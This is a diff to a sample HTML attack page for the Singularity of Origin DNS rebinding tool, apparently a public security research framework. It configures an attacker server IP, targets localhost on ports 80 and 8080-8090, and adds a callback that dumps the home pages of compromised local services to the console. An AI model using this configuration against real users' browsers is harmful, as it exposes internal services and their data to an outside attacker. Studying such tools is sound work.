@@ -1,11 +1,11 @@
+<!doctype html>
+<html lang="en">
 <!--
     A sample fully automated attack that scans a local network for HTTP services,
     attempts to fetch the home page via DNS rebinding
     and dumps it to the developer console in case of success.
     All options are described in more details below.
 -->
-    !doctype html>
-<html lang="en">
 
 <head>
     <title>Singularity of Origin DNS Rebinding Automatic Attack</title>
@@ -16,6 +16,7 @@
 </head>
 
 <body id="body" style="display: none">
+    The home page of vulnerable services will be dumped in the browser developer console.
     <script>
         const configuration = {
             attackHostIPAddress: '80.85.86.45', // Your attacking server IP address.
@@ -62,6 +63,13 @@
             delayDOMLoad: false,
         };
 
+        // Set the callback on successful rebinding a frame
+        // msg contains a frame msg
+        configuration.rebindingSuccessFn = (msg) => {
+            console.log(`Iframe reports attack successful for ${window.location.hostname}\n${msg.data.response}`);
+        }
+
+        //Update the Singularity app configuration
         app.getConfiguration().setManually(configuration);
 
         // Specify the target address specification below.
@@ -73,7 +81,7 @@
         const addrSpec = `127.0.0.1,0.0.0.0`;
 
         // Specify a port range to scan and attack
-        // and *ensure* that Singularity listens on all these ports at startup.
+        // WARNING: You must ensure that Singularity listens on all these ports at startup for now.
         const portSpec = '80,8080-8090';
 
         // Choose one of Singularity's attack payload to deliver to the victim host or write your own.
@@ -94,6 +102,9 @@
             setTimeout(function () {
                 sm.shutDown();
             }, 3000);
+            setTimeout(function () {
+                delaydomloadframe.src = "about:blank";
+            }, 90000);
         }
 
         // Implement a sample attack
